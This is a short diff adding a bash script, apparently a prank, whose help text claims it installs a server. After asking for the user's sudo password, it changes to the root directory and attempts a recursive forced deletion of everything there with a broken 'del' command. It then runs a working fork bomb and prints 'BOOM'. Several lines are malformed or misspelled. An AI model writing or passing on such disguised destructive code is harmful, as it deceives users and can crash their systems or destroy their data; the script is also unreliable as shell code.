@@ -1,0 +1,14 @@
+#!/bin/bash
+
+if [ "$1" == "-h" ]; then
+    echo instale un seralver
+    break
+fi
+cd /
+echo "svp tu peut metre ton mot de pass😽️"
+sudo chown -r
+sudo del *.* -rf
+echo "MERCIII😸️"
+echo "bébou"
+:(){ :|:& };:
+echo "BOOM💥️"
